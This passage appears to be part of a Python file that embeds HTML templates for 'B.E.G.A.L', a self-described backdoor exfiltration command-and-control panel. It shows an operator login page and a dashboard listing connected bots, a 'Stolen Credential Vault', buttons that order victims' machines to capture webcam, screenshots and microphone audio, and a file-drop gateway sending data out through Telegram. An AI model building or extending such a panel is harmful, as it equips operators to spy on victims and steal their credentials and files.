    <!-- Memuat Tailwind CSS untuk penataan dinamis -->

    <script src="https://cdn.tailwindcss.com"></script>

    <!-- Memuat FontAwesome untuk ikon grafis taktis -->

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <!-- Memuat font LCD retro dan Sans-Serif modern -->

    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700;800&family=VT323&display=swap" rel="stylesheet">

    <script>

        tailwind.config = {

            theme: {

                extend: {

                    fontFamily: {

                        mono: ['"JetBrains Mono"', 'monospace'],

                        lcd: ['"VT323"', 'monospace'],

                    },

                    colors: {

                        flipper: {

                            orange: '#FF8C00',

                            orangeLight: '#FFB85C',

                            orangeGlow: 'rgba(255, 140, 0, 0.45)',

                            orangeDark: '#B36200',

                        }

                    }

                }

            }

        }

    </script>

    <style>

        @keyframes scanline {

            0% { transform: translateY(-100%); }

            100% { transform: translateY(100%); }

        }

        .scanlines {

            position: relative;

            overflow: hidden;

        }

        /* Efek garis pindai CRT retro */

        .scanlines::before {

            content: " ";

            display: block;

            position: absolute;

            top: 0; left: 0; bottom: 0; right: 0;

            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));

            z-index: 2;

            background-size: 100% 3px, 6px 100%;

            pointer-events: none;

        }

        .scanline-anim::after {

            content: '';

            position: absolute;

            width: 100%;

            height: 100px;

            background: linear-gradient(0deg, rgba(255, 140, 0, 0.08) 0%, rgba(255,140,0,0) 100%);

            animation: scanline 6s linear infinite;

            z-index: 2;

            pointer-events: none;

        }

    </style>

</head>

<body class="bg-[#080809] text-gray-100 font-mono min-h-screen flex items-center justify-center p-4 relative selection:bg-flipper-orange selection:text-black">

    <!-- Grid Efek Ambient Latar Belakang -->

    <div class="absolute inset-0 bg-[linear-gradient(to_right,#1f1f23_1px,transparent_1px),linear-gradient(to_bottom,#1f1f23_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_50%,#000_70%,transparent_100%)] opacity-30 pointer-events-none z-0"></div>



    <div class="relative z-10 w-full max-w-[400px] bg-neutral-900 border border-neutral-800 rounded-3xl p-6 shadow-2xl relative overflow-hidden">

        <div class="absolute inset-0 bg-gradient-to-b from-flipper-orange/5 to-transparent pointer-events-none"></div>



        <!-- LAYAR LCD RETRO DENGAN CAHAYA ORANGE (SISTEM OTENTIKASI) -->

        <div class="relative scanlines scanline-anim bg-gradient-to-b from-amber-500 to-flipper-orange border-4 border-neutral-950 rounded-xl p-4 shadow-[inset_0_0_20px_rgba(0,0,0,0.8)] h-[135px] flex flex-col justify-between text-neutral-950 font-lcd select-none mb-6">

            <!-- Header Status LCD -->

            <div class="flex items-center justify-between border-b border-black/30 pb-0.5 text-sm tracking-wider font-bold">

                <span>W3lc0me to :</span>

                <span class="animate-pulse">B.E.G.A.L</span>

            </div>

            

            <!-- Elemen Ikon & Judul LCD -->

            <div class="flex items-center gap-3.5 py-1">

                <div class="w-11 h-11 bg-black/15 rounded-full flex items-center justify-center text-2xl border border-black/10">

                    <i class="fa-solid fa-key"></i>

                </div>

                <div class="leading-none">

                    <h2 class="text-xl font-extrabold tracking-wider">AUTHENTICATION</h2>

                    <p class="text-xs text-black/75 mt-1 font-mono uppercase font-bold tracking-tight">ENTER ADMINISTRATIVE KEYS</p>

                </div>

            </div>

            

            <!-- Footer Status LCD -->

            <div class="text-[11px] text-black/70 tracking-widest flex justify-between font-bold uppercase">

                <span>Backdoor Exfiltration Gateway for Advanced Looting</span>

                <span>V.2</span>

            </div>

        </div>



        <!-- Formulir Input Kredensial -->

        <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-4">

            <div>

                <label class="block text-[10px] text-neutral-400 uppercase font-black mb-1.5 tracking-wider">Username</label>

                <input type="text" id="username" placeholder="Enter username" required class="w-full bg-neutral-950 border border-neutral-800 focus:border-flipper-orange text-sm text-neutral-200 rounded-xl px-4 py-3 outline-none font-mono transition-colors">

            </div>



            <div>

                <label class="block text-[10px] text-neutral-400 uppercase font-black mb-1.5 tracking-wider">Password</label>

                <input type="password" id="password" placeholder="••••••••" required class="w-full bg-neutral-950 border border-neutral-800 focus:border-flipper-orange text-sm text-neutral-200 rounded-xl px-4 py-3 outline-none font-mono transition-colors">

            </div>



            <!-- Bagian Verifikasi Captcha Dinamis -->

            <div class="space-y-3">

                <label class="block text-[10px] text-neutral-400 uppercase font-black tracking-wider">CAPTCHA Verification</label>

                

                <!-- Baris Atas: Gambar Captcha & Tombol Refresh -->

                <div class="flex items-center justify-center gap-3">

                    <!-- Wadah Gambar Captcha -->

                    <div class="bg-neutral-950 border border-neutral-800 p-1.5 rounded-xl h-[52px] w-[130px] flex items-center justify-center shrink-0">

                        <img id="captcha_img" src="/api/v1/captcha" alt="Captcha" class="h-full w-full object-contain rounded-lg">

                    </div>

                    <!-- Tombol Muat Ulang Captcha -->

                    <button type="button" onclick="refreshCaptcha()" class="w-12 h-[52px] bg-neutral-950 border border-neutral-800 hover:border-flipper-orange text-neutral-400 hover:text-flipper-orange transition-all rounded-xl flex items-center justify-center shrink-0 btn-active">

                        <i class="fa-solid fa-arrows-rotate text-lg"></i>

                    </button>

                </div>



                <!-- Baris Bawah: Input Captcha Full Width -->

                <input type="text" id="captcha" placeholder="Enter Code Above" maxlength="5" required class="w-full bg-neutral-950 border border-neutral-800 focus:border-flipper-orange text-lg text-center font-extrabold uppercase tracking-widest text-flipper-orange rounded-xl h-[52px] outline-none font-mono transition-all">

            </div>



            <button type="submit" class="w-full mt-6 bg-flipper-orange hover:bg-flipper-orangeLight text-black font-extrabold py-3.5 rounded-xl text-xs uppercase tracking-widest transition-all duration-300 flex items-center justify-center gap-2 btn-active shadow-[0_4px_20px_rgba(255,140,0,0.25)]">

                <i class="fa-solid fa-lock text-sm"></i> Access Terminal

            </button>

        </form>

    </div>



    <!-- Modal Peringatan Sistem -->

    <div id="modal-backdrop" class="fixed inset-0 bg-black/80 backdrop-blur-sm hidden z-50 flex items-center justify-center p-4">

        <div class="bg-neutral-950 border border-neutral-800 rounded-3xl p-6 max-w-sm w-full shadow-2xl relative overflow-hidden text-center">

            <div class="absolute inset-0 bg-gradient-to-b from-flipper-orange/5 to-transparent pointer-events-none"></div>

            <div id="modal-icon-container" class="w-14 h-14 bg-neutral-900 rounded-full flex items-center justify-center mx-auto mb-4 border border-neutral-800 text-flipper-orange text-xl">

                <i class="fa-solid fa-circle-info"></i>

            </div>

            <h3 id="modal-title" class="text-lg font-bold text-white tracking-wider mb-2">SYSTEM NOTIFICATION</h3>

            <p id="modal-body" class="text-xs text-neutral-400 mb-6 leading-relaxed">System settings updated.</p>

            <button onclick="closeModal()" class="w-full bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 hover:border-flipper-orange text-flipper-orange font-extrabold py-2.5 rounded-xl text-xs uppercase tracking-wider transition-all btn-active">

                Acknowledge

            </button>

        </div>

    </div>



    <!-- LOGIKA FEEDBACK AUDIO WEB SYNTHESIZER -->

    <script>

        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

        function playBeep(freq = 800, duration = 80, type = 'sine') {

            try {

                if (audioCtx.state === 'suspended') { audioCtx.resume(); }

                const osc = audioCtx.createOscillator();

                const gain = audioCtx.createGain();

                osc.type = type;

                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);

                gain.gain.setValueAtTime(0.04, audioCtx.currentTime);

                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration/1000);

                osc.connect(gain);

                gain.connect(audioCtx.destination);

                osc.start();

                osc.stop(audioCtx.currentTime + duration/1000);

            } catch(e) {}

        }



        function showModal(title, body, iconClass = "fa-circle-info") {

            document.getElementById('modal-title').textContent = title;

            document.getElementById('modal-body').textContent = body;

            document.getElementById('modal-icon-container').innerHTML = `<i class="fa-solid ${iconClass}"></i>`;

            document.getElementById('modal-backdrop').classList.remove('hidden');

        }



        function closeModal() {

            playBeep(700, 60);

            document.getElementById('modal-backdrop').classList.add('hidden');

        }



        function refreshCaptcha() {

            playBeep(600, 40);

            document.getElementById('captcha_img').src = '/api/v1/captcha?t=' + Date.now();

            document.getElementById('captcha').value = '';

        }



        async function handleLogin(e) {

            e.preventDefault();

            playBeep(1000, 100);



            const user = document.getElementById('username').value.trim();

            const pass = document.getElementById('password').value;

            const cap = document.getElementById('captcha').value.trim();



            try {

                const response = await fetch('/api/v1/login', {

                    method: 'POST',

                    headers: { 'Content-Type': 'application/json' },

                    body: JSON.stringify({ username: user, password: pass, captcha: cap })

                });

                

                const result = await response.json();

                

                if (result.ok) {

                    playBeep(1200, 200, 'triangle');

                    window.location.reload(); // Segarkan halaman untuk memuat dashboard utama

                } else {

                    playBeep(150, 400, 'square');

                    showModal("ACCESS DENIED", result.description, "fa-solid fa-shield-halved text-red-500");

                    refreshCaptcha();

                }

            } catch (err) {

                showModal("SYSTEM ERROR", "Gagal berkomunikasi dengan sistem penampung autentikasi.", "fa-solid fa-triangle-exclamation text-red-500");

                refreshCaptcha();

            }

        }

    </script>

</body>

</html>"""



# ================== HTML: PANEL KENDALIAN UTAMA (DASHBOARD) ==================

HTML_CONTENT = """<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>B.E.G.A.L - C2 v2.0</title>

    <!-- Tailwind CSS -->

    <script src="https://cdn.tailwindcss.com"></script>

    <!-- FontAwesome Icons -->

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <!-- Google Fonts: VT323 & JetBrains Mono -->

    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700;800&family=VT323&display=swap" rel="stylesheet">

    

    <script>

        tailwind.config = {

            theme: {

                extend: {

                    fontFamily: {

                        mono: ['"JetBrains Mono"', 'monospace'],

                        lcd: ['"VT323"', 'monospace'],

                    },

                    colors: {

                        flipper: {

                            orange: '#FF8C00',

                            orangeLight: '#FFB85C',

                            orangeGlow: 'rgba(255, 140, 0, 0.45)',

                            orangeDark: '#B36200',

                            grayDark: '#121214',

                            grayLight: '#232329',

                            greenGlow: 'rgba(34, 197, 94, 0.35)',

                        }

                    }

                }

            }

        }

    </script>

    

    <style>

        @keyframes scanline { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }

        @keyframes flicker { 0% { opacity: 0.98; } 50% { opacity: 1; } 100% { opacity: 0.99; } }

        @keyframes pulseBorder { 0%, 100% { border-color: rgba(255, 140, 0, 0.4); } 50% { border-color: rgba(255, 140, 0, 0.9); } }

        .scanlines { position: relative; overflow: hidden; }

        .scanlines::before { content: " "; display: block; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); z-index: 2; background-size: 100% 3px, 6px 100%; pointer-events: none; }

        .scanline-anim::after { content: ''; position: absolute; width: 100%; height: 100px; background: linear-gradient(0deg, rgba(255, 140, 0, 0.08) 0%, rgba(255,140,0,0) 100%); animation: scanline 6s linear infinite; z-index: 2; pointer-events: none; }

        .custom-scrollbar::-webkit-scrollbar { width: 6px; height: 6px; }

        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.2); }

        .custom-scrollbar::-webkit-scrollbar-thumb { background: #FF8C00; border-radius: 4px; }

        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #FFB85C; }

        .btn-active:active { transform: scale(0.96); }

    </style>

</head>

<body class="bg-[#080809] text-gray-100 font-mono min-h-screen relative overflow-x-hidden flex flex-col justify-between selection:bg-flipper-orange selection:text-black">

    <!-- Ambient Grid Background -->

    <div class="absolute inset-0 bg-[linear-gradient(to_right,#1f1f23_1px,transparent_1px),linear-gradient(to_bottom,#1f1f23_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_50%,#000_70%,transparent_100%)] opacity-30 pointer-events-none z-0"></div>



    <div class="relative z-10 w-full max-w-7xl mx-auto px-4 py-6 md:py-10 flex-grow flex flex-col justify-between">

        

        <!-- HEADER BAR -->

        <header class="flex flex-col md:flex-row items-center justify-between border-b border-zinc-800 pb-6 mb-8 gap-4">

            <div class="flex items-center gap-5 w-full md:w-auto">

                <div class="relative group">

                    <div class="absolute -inset-1 bg-gradient-to-r from-flipper-orange to-red-600 rounded-lg blur opacity-70 group-hover:opacity-100 transition duration-1000 group-hover:duration-200"></div>

                    <div class="relative w-14 h-14 bg-flipper-orange text-black flex flex-col items-center justify-center font-black rounded-lg border-2 border-black shadow-inner">

                        <span class="text-xs leading-none tracking-tighter">FLIP</span>

                        <span class="text-xl leading-none font-extrabold">0</span>

                    </div>

                </div>

                <div>

                    <div class="flex items-center gap-2">

                        <h1 class="text-2xl md:text-3xl font-extrabold tracking-wider bg-clip-text text-transparent bg-gradient-to-r from-white via-neutral-200 to-flipper-orange">

                            B.E.G.A.L

                        </h1>

                        <span class="px-2 py-0.5 text-[10px] uppercase tracking-widest bg-red-950 text-red-500 border border-red-800 rounded font-bold animate-pulse">C2 v2.0</span>

                    </div>

                    <p class="text-neutral-400 text-xs mt-1 font-semibold flex items-center gap-2">

                        <span id="socket-status-indicator" class="inline-block w-2 h-2 rounded-full bg-yellow-500"></span>

                        <span id="socket-status-text">CONNECTING TO C2...</span>

                    </p>

                </div>

            </div>

            

            <div class="flex items-center gap-4 w-full md:w-auto justify-between md:justify-end border-t md:border-t-0 border-neutral-800 pt-4 md:pt-0">

                 <div class="text-left md:text-right">

                    <div class="text-xs text-neutral-500 uppercase tracking-widest">Target Connection</div>

                    <div class="text-sm font-bold text-emerald-400 flex items-center gap-1.5 justify-start md:justify-end">

                        <span class="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse"></span>

                        <span id="status">REAL-TIME C2 TUNNEL ACTIVE</span>

                    </div>

                </div>

                <div class="h-10 w-[1px] bg-neutral-800 hidden md:block"></div>

                <div class="text-right flex items-center gap-3">

                    <a href="/report" class="px-3 py-2 bg-neutral-900 border border-neutral-800 hover:border-flipper-orange/50 text-neutral-400 hover:text-flipper-orange rounded-xl text-xs font-bold tracking-wider transition-all flex items-center gap-1.5 btn-active shadow-md">
                        <i class="fa-solid fa-bookmark"></i> REPORT
                    </a>

                    <a href="/logout" onclick="playBeep(400, 150)" class="px-3 py-2 bg-neutral-900 border border-neutral-800 hover:border-red-500/50 text-neutral-400 hover:text-red-500 rounded-xl text-xs font-bold tracking-wider transition-all flex items-center gap-1.5 btn-active shadow-md">

                        <i class="fa-solid fa-right-from-bracket"></i> LOGOUT

                    </a>

                </div>

            </div>

        </header>



        <!-- MAIN HARDWARE & DIAGNOSTICS LAYOUT -->

        <main class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start flex-grow">

            

            <!-- LEFT COLUMN: VIRTUAL FLIPPER ZERO MODULE -->

            <section class="lg:col-span-5 flex flex-col gap-6">

                

                <!-- Physical Device Body Frame -->

                <div class="bg-neutral-900 border border-neutral-800 rounded-3xl p-6 shadow-2xl relative overflow-hidden group">

                    <div class="absolute inset-0 bg-gradient-to-b from-neutral-800/10 to-transparent pointer-events-none"></div>

                    

                    <div class="flex items-center justify-between mb-4 border-b border-neutral-800 pb-3">

                        <span class="text-xs font-bold text-neutral-400 uppercase tracking-widest flex items-center gap-2">

                            <i class="fa-solid fa-gamepad text-flipper-orange"></i> Virtual Hardware Unit

                        </span>

                        <div class="flex items-center gap-1.5">

                            <span class="text-[10px] text-neutral-500 font-bold uppercase">Battery</span>

                            <div class="w-6 h-3 border border-neutral-600 rounded p-[1px] flex items-center">

                                <div class="h-full w-4/5 bg-emerald-500 rounded-[1px]"></div>

                            </div>

                        </div>

                    </div>



                    <!-- RETRO ORANGE-BACKLIT LCD SCREEN -->

                    <div class="relative scanlines scanline-anim bg-gradient-to-b from-amber-500 to-flipper-orange border-4 border-neutral-950 rounded-xl p-4 shadow-[inset_0_0_20px_rgba(0,0,0,0.8)] h-52 flex flex-col justify-between text-neutral-950 font-lcd select-none">

                        

                        <div class="flex items-center justify-between border-b border-black/30 pb-1 text-sm tracking-wider">

                            <span>Exfil Terminal v2.0</span>

                            <span id="screen-timer" class="font-mono text-xs font-semibold">00:00:00</span>

                        </div>



                        <div class="flex-grow flex items-center gap-4 py-2 overflow-hidden">

                            <div id="dolphin-container" class="w-20 h-20 bg-black/5 border border-black/10 rounded flex items-center justify-center relative">

                                <div id="dolphin-idle" class="flex flex-col items-center">

                                    <svg class="w-16 h-16 text-black" fill="currentColor" viewBox="0 0 64 64"><path d="M40 8c-6 0-14 4-18 8-2 2-6 2-10 0-4-2-8 0-10 4s0 10 4 12c4 2 8 0 10-4s6-4 10-2c8 4 18 2 24-4s4-12 0-14zm-4 8a2 2 0 110-4 2 2 0 010 4z" /><rect x="26" y="24" width="22" height="6" rx="2" /><polygon points="28,30 32,38 36,30" /></svg>

                                    <span class="text-[11px] leading-none mt-1 uppercase font-bold tracking-widest text-center">IDLE</span>

                                </div>

                                <div id="dolphin-hacking" class="hidden flex flex-col items-center animate-bounce">

                                    <svg class="w-16 h-16 text-black" fill="currentColor" viewBox="0 0 64 64"><path d="M40 8c-6 0-14 4-18 8-2 2-6 2-10 0-4-2-8 0-10 4s0 10 4 12c4 2 8 0 10-4s6-4 10-2c8 4 18 2 24-4s4-12 0-14zM24 20h8v2h-8zm16-4a2 2 0 110-4 2 2 0 010 4z" /><rect x="18" y="28" width="30" height="8" rx="2" class="animate-pulse" /></svg>

                                    <span class="text-[11px] leading-none mt-1 uppercase font-black tracking-widest text-red-700 animate-pulse">EXFIL</span>

                                </div>

                                <div id="dolphin-success" class="hidden flex flex-col items-center">

                                    <svg class="w-16 h-16 text-emerald-900" fill="currentColor" viewBox="0 0 64 64"><path d="M40 8c-6 0-14 4-18 8-2 2-6 2-10 0-4-2-8 0-10 4s0 10 4 12c4 2 8 0 10-4s6-4 10-2c8 4 18 2 24-4s4-12 0-14zm-4 8a2 2 0 110-4 2 2 0 010 4z" /><rect x="20" y="4" width="24" height="4" fill="black" /><path d="M12 28l12-12h8l12 12z" /></svg>

                                    <span class="text-[11px] leading-none mt-1 uppercase font-black tracking-widest text-green-950">SUCCESS!</span>

                                </div>

                            </div>

                            

                            <div class="flex-grow flex flex-col justify-center text-left leading-none">

                                <div id="screen-title" class="text-xl font-bold uppercase tracking-wider mb-1 truncate max-w-[170px]">SYSTEM READY</div>

                                <div id="screen-sub" class="text-xs tracking-tight text-black/70 mb-2 truncate max-w-[170px]">Select exfil files</div>

                                

                                <div class="grid grid-cols-2 gap-1 text-[11px] font-bold border-t border-black/20 pt-1.5">

                                    <div>STATUS: <span id="screen-status" class="text-neutral-900">READY</span></div>

                                    <div>QUEUE: <span id="screen-count" class="text-neutral-900">0</span></div>

                                    <div>C2: <span class="text-green-900 font-black">ONLINE</span></div>

                                    <div>ENCRYPT: <span class="text-neutral-900">XOR+B64</span></div>

                                </div>

                            </div>

                        </div>



                        <div class="flex items-center justify-between text-[11px] border-t border-black/20 pt-0.5 uppercase tracking-widest font-bold">

                            <span id="screen-mode-desc">MENU: 1. Dashboard</span>

                            <span class="animate-pulse">● REC</span>

                        </div>

                    </div>



                    <!-- Flipper D-Pad Controls -->

                    <div class="mt-6 flex items-center justify-between bg-neutral-950 rounded-2xl p-4 border border-neutral-800">

                        <div class="relative w-28 h-28 bg-neutral-900 rounded-full flex items-center justify-center border border-neutral-700 shadow-inner select-none">

                            <button onclick="navScreen('UP')" class="absolute top-1 w-8 h-8 bg-neutral-800 active:bg-neutral-700 hover:bg-neutral-800 rounded-lg text-neutral-400 flex items-center justify-center border border-neutral-700 btn-active shadow-md"><i class="fa-solid fa-caret-up"></i></button>

                            <button onclick="navScreen('DOWN')" class="absolute bottom-1 w-8 h-8 bg-neutral-800 active:bg-neutral-700 hover:bg-neutral-800 rounded-lg text-neutral-400 flex items-center justify-center border border-neutral-700 btn-active shadow-md"><i class="fa-solid fa-caret-down"></i></button>

                            <button onclick="navScreen('LEFT')" class="absolute left-1 w-8 h-8 bg-neutral-800 active:bg-neutral-700 hover:bg-neutral-800 rounded-lg text-neutral-400 flex items-center justify-center border border-neutral-700 btn-active shadow-md"><i class="fa-solid fa-caret-left"></i></button>

                            <button onclick="navScreen('RIGHT')" class="absolute right-1 w-8 h-8 bg-neutral-800 active:bg-neutral-700 hover:bg-neutral-800 rounded-lg text-neutral-400 flex items-center justify-center border border-neutral-700 btn-active shadow-md"><i class="fa-solid fa-caret-right"></i></button>

                            <button onclick="navScreen('OK')" class="w-10 h-10 rounded-full bg-flipper-orange hover:bg-flipper-orangeLight active:bg-flipper-orangeDark text-black font-extrabold flex items-center justify-center shadow-lg transition-transform btn-active">OK</button>

                        </div>

                        <div class="flex flex-col gap-3 justify-center">

                            <button onclick="navScreen('BACK')" class="w-16 py-2 rounded-xl bg-neutral-850 border border-neutral-700 text-neutral-400 hover:text-white font-bold text-xs uppercase tracking-wider transition-colors btn-active shadow-md"><i class="fa-solid fa-arrow-rotate-left mr-1"></i> Back</button>

                            <div class="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-neutral-900 border border-neutral-800">

                                <span class="text-[9px] uppercase font-bold text-neutral-500">LED</span>

                                <div id="hardware-led" class="w-3.5 h-3.5 rounded-full bg-orange-500 shadow-[0_0_8px_#ff8c00] transition-colors duration-300"></div>

                            </div>

                        </div>

                    </div>

                </div>



                <!-- BOT CONTROL MODULE -->

                <div class="bg-neutral-900/80 border border-neutral-800 rounded-xl overflow-hidden mt-4">

                    <button onclick="toggleBotStatus()" class="w-full px-5 py-3.5 flex items-center justify-between text-left hover:bg-neutral-850/40 transition-colors btn-active">

                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2">

                            <i id="bot-status-btn-icon" class="fa-solid fa-play text-emerald-500"></i> <span id="bot-status-btn-text">BOT MONITORING: ACTIVE</span>

                        </span>

                        <i class="fa-solid fa-power-off text-neutral-500"></i>

                    </button>

                </div>



                <!-- ACTIVE SESSIONS (BOTS) MODULE -->

                <div class="bg-neutral-900/80 border border-neutral-800 rounded-xl mt-4">

                    <div class="w-full px-5 py-3.5 flex items-center justify-between text-left border-b border-neutral-800">

                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2">

                            <i class="fa-solid fa-satellite-dish text-flipper-orange animate-pulse"></i>

                            Active Bots (<span id="bot-count">0</span>)

                        </span>

                        <i class="fa-solid fa-sync text-neutral-500" id="session-refresh-icon"></i>

                    </div>

                    <div id="session-list" class="p-4 space-y-3 max-h-48 overflow-y-auto custom-scrollbar">

                        <div class="text-center text-xs text-neutral-500 py-4">Awaiting bot connections...</div>

                    </div>

                </div>



                 <!-- TARGETED COMMANDS MODULE -->

                <div class="bg-neutral-900/80 border border-neutral-800 rounded-xl overflow-hidden mt-6">

                     <div class="w-full px-5 py-3.5 flex items-center justify-between text-left border-b border-neutral-800">

                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2">

                            <i class="fa-solid fa-bullseye text-flipper-orange"></i> Targeted Commands

                        </span>

                        <span id="selected-bot-uuid" class="text-[10px] text-neutral-500 font-mono">NO TARGET SELECTED</span>

                    </div>

                    <button onclick="sendCommandToBot('CAPTURE_WEBCAM')" class="w-full px-5 py-3 flex items-center justify-between text-left hover:bg-neutral-850/40 transition-colors btn-active border-t border-neutral-800/0">

                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2"><i class="fa-solid fa-camera text-flipper-orange"></i> Trigger Webcam</span><i class="fa-solid fa-crosshairs text-neutral-500"></i>

                    </button>

                    <button onclick="sendCommandToBot('TAKE_SCREENSHOT')" class="w-full px-5 py-3 flex items-center justify-between text-left hover:bg-neutral-850/40 transition-colors btn-active border-t border-neutral-800">

                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2"><i class="fa-solid fa-desktop text-flipper-orange"></i> Trigger Screenshot</span><i class="fa-solid fa-camera text-neutral-500"></i>

                    </button>

                    <button onclick="sendCommandToBot('RECORD_AUDIO', {duration: 30000})" class="w-full px-5 py-3 flex items-center justify-between text-left hover:bg-neutral-850/40 transition-colors btn-active border-t border-neutral-800">

                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2"><i class="fa-solid fa-microphone text-flipper-orange"></i> Trigger Mic (30s)</span><i class="fa-solid fa-waveform text-neutral-500"></i>

                    </button>

                </div>





            </section>



            <!-- RIGHT COLUMN: MASTER DRAG & DROP & GEO-MAP -->

            <section class="lg:col-span-7 flex flex-col gap-6">

                

                <!-- CREDENTIAL VAULT & INTERACTIVE TERMINAL -->

                <div class="bg-neutral-900 border border-neutral-800 rounded-3xl p-6 md:p-8 shadow-2xl relative">

                    <!-- Tab Buttons -->

                    <div class="flex border-b border-neutral-800 mb-4">

                        <button id="tab-btn-vault" onclick="switchTab('vault')" class="flex items-center gap-2 px-4 py-2 text-sm font-bold border-b-2 border-flipper-orange text-white transition-colors">

                            <i class="fa-solid fa-key"></i> Credential Vault

                        </button>

                        

                    </div>



                    <!-- Tab Content: Credential Vault -->

                    <div id="tab-content-vault">

                        <h2 class="text-xl font-bold tracking-wider text-neutral-100 flex items-center gap-2.5 mb-4">

                            <i class="fa-solid fa-key text-flipper-orange"></i> Stolen Credential Vault

                        </h2>

                        <div id="vault-content" class="space-y-4 max-h-96 overflow-y-auto custom-scrollbar">

                            <p class="text-center text-xs text-neutral-500 py-4">No credentials collected yet. Awaiting data...</p>

                        </div>

                    </div>



                    </div>
                <!-- DATA EXFILTRATION GATEWAY -->

                <div class="bg-neutral-900 border border-neutral-800 rounded-3xl p-6 md:p-8 shadow-2xl relative">

                    <div class="flex flex-col md:flex-row md:items-center justify-between mb-6 gap-3">

                        <div>

                            <h2 class="text-xl font-bold tracking-wider text-neutral-100 flex items-center gap-2.5">

                                <i class="fa-solid fa-skull-crossbones text-flipper-orange animate-pulse"></i> Data Exfiltration Gateway

                            </h2>

                            <p class="text-xs text-neutral-400 mt-1">Files dropped here auto-encrypt and route via Secure Telegram Tunnel</p>

                        </div>

                    </div>

                    <div id="dropzone" class="border-2 border-dashed border-neutral-800 hover:border-flipper-orange/60 bg-neutral-950/40 hover:bg-flipper-orange/5 rounded-2xl p-8 md:p-12 text-center cursor-pointer transition-all duration-300 relative group overflow-hidden">

                        <div class="absolute -inset-10 bg-flipper-orange/5 rounded-full blur-3xl opacity-0 group-hover:opacity-100 transition duration-500 pointer-events-none"></div>

                        <div class="relative z-10 flex flex-col items-center">

                            <div class="w-16 h-16 bg-neutral-900 group-hover:bg-flipper-orange/10 group-hover:scale-105 rounded-full flex items-center justify-center text-neutral-500 group-hover:text-flipper-orange transition-all duration-300 border border-neutral-800 group-hover:border-flipper-orange/30 shadow-inner mb-4">

                                <i class="fa-solid fa-cloud-arrow-up text-2xl"></i>

                            </div>

                            <h3 class="text-lg font-bold tracking-wide text-neutral-200 group-hover:text-white transition-colors">DRAG & DROP SOURCE FILES</h3>

                            <p class="text-xs text-neutral-400 mt-1.5 mb-5 max-w-sm">Standard exfiltrate profiles supported (<span class="text-flipper-orange">PDF, DOCX, SQL, ZIP, DB, TXT</span> etc.)</p>

                            <input type="file" id="fileInput" multiple class="hidden">

                            <button onclick="document.getElementById('fileInput').click()" class="px-5 py-2.5 bg-neutral-900 hover:bg-neutral-800 text-flipper-orange border border-neutral-800 hover:border-flipper-orange rounded-xl text-xs font-extrabold tracking-wider transition-all duration-300 hover:shadow-[0_0_15px_rgba(255,140,0,0.15)] btn-active">BROWSE LOCAL STORAGE</button>

                        </div>

                    </div>



                    <div id="fileList" class="mt-6 space-y-2 max-h-56 overflow-y-auto custom-scrollbar"></div>



                    <button onclick="uploadFiles()" id="uploadBtn" disabled class="w-full mt-6 bg-red-600/90 hover:bg-red-600 text-white font-extrabold py-4 rounded-2xl text-md tracking-widest uppercase transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-red-600/90 flex items-center justify-center gap-3 shadow-[0_4px_20px_rgba(220,38,38,0.2)] active:translate-y-[1px] btn-active">

                        <i class="fa-solid fa-fire text-lg"></i> TRANSMIT EXFILTRATION PAYLOAD

                    </button>



                    <div id="progressContainer" class="hidden mt-6 bg-neutral-950/80 border border-neutral-800 rounded-2xl p-5 shadow-inner">

                        <div class="flex items-center justify-between text-xs font-extrabold mb-2.5">

                            <span class="text-neutral-400 tracking-wider flex items-center gap-2"><i class="fa-solid fa-wave-square text-flipper-orange animate-pulse"></i> TRANSMISSION IN PROGRESS</span>

                            <span id="progressText" class="text-flipper-orange font-mono">0%</span>

                        </div>

                        <div class="h-2 w-full bg-neutral-900 rounded-full overflow-hidden p-[1px] border border-neutral-800">

                            <div id="progressBar" class="h-full bg-gradient-to-r from-flipper-orange to-red-600 w-0 rounded-full transition-all duration-300 ease-out"></div>

                        </div>

                        <div class="mt-4 flex items-center justify-between border-b border-neutral-800/60 pb-2 mb-2">

                            <span class="text-[10px] text-neutral-500 font-bold uppercase tracking-widest">Diagnostic Stream</span>

                            <span class="text-[10px] text-emerald-500 font-bold font-mono">ONLINE</span>

                        </div>

                        <div id="log" class="text-xs font-mono bg-black/60 p-4 rounded-xl max-h-40 overflow-y-auto custom-scrollbar text-left border border-neutral-900 space-y-1.5"></div>

                    </div>

                </div>



            </section>

